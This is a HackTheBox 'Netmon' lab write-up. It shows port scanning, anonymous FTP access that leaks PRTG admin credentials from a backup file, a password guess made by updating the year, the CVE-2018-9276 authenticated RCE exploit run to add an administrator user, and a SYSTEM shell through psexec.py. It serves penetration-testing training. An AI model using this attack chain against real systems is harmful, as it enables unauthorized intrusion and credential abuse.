---
layout: post
title: HTB Netmon WriteUp
date: 2024-12-14
categories:
  - HackTheBox
  - HackTheBox-Windows
tags:
  - CTF
  - OSCP
  - HackTheBox
  - Windows
  - PRTG-Exploitation
  - Psexec
  - Credentials-Leakage
  - FTP-Anon-Allowed
media_subpath: /assets/img/Netmon
---
![Desktop View](Netmon.png){: w="800"  h="400" }



# Netmon Skills


>**Netmon** is an easy Windows machine where we will use the following skills:

-  **Port Discovery**
- **Web Tech's Enumeration**
- **Credentials Leakage**
-  **Abusing FTP Anonymous User Allowed**
-  **PRTG Remote Code Execution**
-  **Spawning Shell via psexec.py**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **21**, **80**, **139**, **445**, **5985** & port **47001**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts
Nmap scan report for 10.10.10.152
Host is up, received user-set (0.12s latency).
Scanned at 2024-12-14 01:24:46 CET for 23s
Not shown: 62552 closed tcp ports (reset), 2970 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-14 01:26 CET
Nmap scan report for 10.10.10.152
Host is up (0.18s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_11-10-23  09:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-server-header: PRTG/18.1.37.13946
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-14T00:27:51
|_  start_date: 2024-12-14T00:18:55
```

So we have to check the following ports & services:

- **Port 21 --> Microsoft ftpd**
- **Port 80 --> Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)**
- **Port 445 --> Unknown**

Let's start with the HTTP service.

---
## Port 80 Enumeration

At first i run `whatweb`,  to seek for some versions and technologies used in the website:

```bash
❯ whatweb 10.10.10.152

http://10.10.10.152 [302 Found] Country[RESERVED][ZZ], HTTPServer[PRTG/18.1.37.13946], IP[10.10.10.152], PRTG-Network-Monitor[18.1.37.13946,PRTG], RedirectLocation[/index.htm], UncommonHeaders[x-content-type-options], X-XSS-Protection[1; mode=block]
```

If we check we can see multiple times the acronym **PRTG**, also in the `nmap` scan, and we also have what looks like a version **HTTPServer[PRTG/18.1.37.13946]**, but before checking for any vulnerability let's check the website through a browser.

![Desktop View](NetmonMainPage.png)

We are in front of a login page and we can now confirm that we are in front of a PRTG service, i didn't know what this service is, so i checked it with a quick search.

According to Wikipedia: 

- *PRTG (Paessler Router Traffic Grapher ) is a network monitoring software developed by Paessler GmbH. It monitors system conditions like bandwidth usage or uptime and collect statistics from miscellaneous hosts such as switches, routers, servers, and other devices and applications.*

So once we know what we are facing, let's check if there is any publicly available exploit for this specific version using `searchsploit`.

```bash
❯ searchsploit PRTG
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution                                                                                    | windows/webapps/46527.sh
PRTG Network Monitor 20.4.63.1412 - 'maps' Stored XSS                                                                                                   | windows/webapps/49156.txt
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)                                                                                | windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                                                                                                 | java/webapps/34108.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------
```

Taking a look we can see that there is a **Authenticated RCE**  exploit available, the version is not the same as ours but out version is older so it might vulnerable.

Currently we don't own any valid credentials but if you remember we have a FTP service that allow us to login without credentials so let's see if we can find anything good there.

## Port 21 Enumeration

The `nmap` scan show that the **anonymous** user is allowed in the FTP service, so let's log in and see if there is something useful.

```bash
❯ ftp 10.10.10.152
Connected to 10.10.10.152.
220 Microsoft FTP Service
Name (10.10.10.152:ne4rby): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

Listing the content we can see what looks like the **root of a Windows machine**, probably the target machine.

```bash
ftp> ls -a
229 Entering Extended Passive Mode (|||50283|)
125 Data connection already open; Transfer starting.
11-20-16  09:46PM       <DIR>          $RECYCLE.BIN
02-02-19  11:18PM                 1024 .rnd
11-20-16  08:59PM               389408 bootmgr
07-16-16  08:10AM                    1 BOOTNXT
02-03-19  07:05AM       <DIR>          Documents and Settings
02-25-19  09:15PM       <DIR>          inetpub
12-13-24  07:18PM            738197504 pagefile.sys
07-16-16  08:18AM       <DIR>          PerfLogs
02-25-19  09:56PM       <DIR>          Program Files
02-02-19  11:28PM       <DIR>          Program Files (x86)
12-15-21  09:40AM       <DIR>          ProgramData
02-03-19  07:05AM       <DIR>          Recovery
02-03-19  07:04AM       <DIR>          System Volume Information
02-03-19  07:08AM       <DIR>          Users
11-10-23  09:20AM       <DIR>          Windows
226 Transfer complete.
```

So maybe we can find valid credentials if we find the **PRTG configuration files**, after querying *PRTG configuration file location* in Google i found a [webpage](https://www.paessler.com/manuals/prtg/data_storage), it show that the file where credentials are stored is at the next location:

```shell
%programdata%\Paessler\PRTG Network Monitor\PRTG Configuration.dat
```

So let's see if we can find this file in the FTP server.

```bash
ftp> pwd
Remote directory: /ProgramData/Paessler/PRTG Network Monitor
ftp> ls
229 Entering Extended Passive Mode (|||50454|)
125 Data connection already open; Transfer starting.
12-13-24  08:01PM       <DIR>          Configuration Auto-Backups
12-13-24  07:19PM       <DIR>          Log Database
02-02-19  11:18PM       <DIR>          Logs (Debug)
02-02-19  11:18PM       <DIR>          Logs (Sensors)
02-02-19  11:18PM       <DIR>          Logs (System)
12-13-24  07:19PM       <DIR>          Logs (Web Server)
12-13-24  07:24PM       <DIR>          Monitoring Database
02-25-19  09:54PM              1189697 PRTG Configuration.dat
02-25-19  09:54PM              1189697 PRTG Configuration.old
07-14-18  02:13AM              1153755 PRTG Configuration.old.bak
12-13-24  08:00PM              1673434 PRTG Graph Data Cache.dat
02-25-19  10:00PM       <DIR>          Report PDFs
02-02-19  11:18PM       <DIR>          System Information Database
02-02-19  11:40PM       <DIR>          Ticket Database
02-02-19  11:18PM       <DIR>          ToDo Database
226 Transfer complete.
ftp> 
```

We find 3 files named as the file we are looking for, so i downloaded them to analyze them.

```bash
ftp> prompt
Interactive mode off.
ftp> mget PRTG\ C*
local: PRTG Configuration.dat remote: PRTG Configuration.dat
229 Entering Extended Passive Mode (|||50533|)
150 Opening ASCII mode data connection.
 12% |****************                                                                                                                             |   139 KiB  139.78 KiB/s    00:07 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                                                             |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
local: PRTG Configuration.old remote: PRTG Configuration.old
229 Entering Extended Passive Mode (|||50534|)
150 Opening ASCII mode data connection.
 20% |****************************                                                                                                                 |   243 KiB  243.70 KiB/s    00:03 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                                                             |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
229 Entering Extended Passive Mode (|||50535|)
150 Opening ASCII mode data connection.
 79% |***************************************************************************************************************                              |   896 KiB  447.84 KiB/s    00:00 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                                                             |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 1 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
```

After downloading i checked one per one each file and finally at the **PRTG Configuration.old.bak** i found credentials.

```bash
</dbcredentials>
            <dbpassword>
              <!-- User: prtgadmin -->
              PrTg@dmin2018
```

So i tried them at the login page but they didn't work, i get pretty confused at this time, so after a while i realized that this password is from a old backup, and there is a year in the pass, so after changing the **2018** to a **2019** i logged in with the next credentials:

- **prtgadmin:PrTg@dmin2019**

![Desktop View](NetmonAdminPanel.png)

So now is time to use the exploit we found before, let's check the exploit and see what it does.

## Port 80 Exploitation

Firstly, let's get the exploit to our current directory and rename it.

```bash
❯ searchsploit -m windows/webapps/46527.sh
❯ mv 46527.sh exploit.sh
❯ cat exploit.sh
```

After checking the exploit, it does create a elevated user in the local machine abusing a RCE vulnerability.

The exploit ask us to provide the target IP and the session cookie of the PRTG admin panel.

```bash
❯ ./exploit.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=ezU1RUYyMTBDLUYzQTctNDgyNy04MEE2LTVFMUJDRDk2NUUyNn0%3D"

[+]#########################################################################[+] 
[*] Authenticated PRTG network Monitor remote code execution                [*] 
[+]#########################################################################[+] 
[*] Date: 11/03/2019                                                        [*] 
[+]#########################################################################[+] 
[*] Author: https://github.com/M4LV0   lorn3m4lvo@protonmail.com            [*] 
[+]#########################################################################[+] 
[*] Vendor Homepage: https://www.paessler.com/prtg                          [*] 
[*] Version: 18.2.38                                                        [*] 
[*] CVE: CVE-2018-9276                                                      [*] 
[*] Reference: https://www.codewatch.org/blog/?p=453                        [*] 
[+]#########################################################################[+] 

# login to the app, default creds are prtgadmin/prtgadmin. once athenticated grab your cookie and use it with the script.
# run the script to create a new user 'pentest' in the administrators group with password 'P3nT3st!' 

[+]#########################################################################[+] 

 [*] file created 
 [*] sending notification wait....

 [*] adding a new user 'pentest' with password 'P3nT3st' 
 [*] sending notification wait....

 [*] adding a user pentest to the administrators group 
 [*] sending notification wait....


 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun!
```

It worked, once finished it show us the credentials of the new user, now we have to found a way to use them to log in to the machine.

## Getting a Shell via SMB

So, since SMB is active we can use `psexec.py` to use the valid credentials and get a shell.

For the ones who don't know what `psexec.py` is:

>`psexec.py` is a Python script from the Impacket toolkit that allows remote code execution on Windows systems via SMB, emulating PsExec functionality. It works by creating a service on the target machine using valid SMB credentials, running the specified command, and then removing the service after execution.

Let's copy `psexec.py` to our current directory.

```bash
cp /usr/share/doc/python3-impacket/examples/psexec.py .
```

The use is fairly easy, pretty similar to `ssh`, just provide the user and the IP address and then provide the password.

```bash
❯ python psexec.py pentest@10.10.10.152
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 10.10.10.152.....
[*] Found writable share ADMIN$
[*] Uploading file jDZWWcWT.exe
[*] Opening SVCManager on 10.10.10.152.....
[*] Creating service zzDX on 10.10.10.152.....
[*] Starting service zzDX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```



---
## Shell as System

Once inside we are currently `nt authority\system` so no privilege escalation needed.

The flag is located in `C:\Users\Administrator\Desktop/root.txt`


```bash
C:\Users\Administrator\Desktop> dir 
 Volume in drive C has no label.
 Volume Serial Number is 0EF5-E5E5

 Directory of C:\Users\Administrator\Desktop

02/02/2019  11:35 PM    <DIR>          .
02/02/2019  11:35 PM    <DIR>          ..
12/14/2024  07:29 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   6,743,265,280 bytes free

C:\Users\Administrator\Desktop> type root.txt
14f***4423f61a******9c7ee329fc97
```

-- -

![Desktop View](NetmonPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

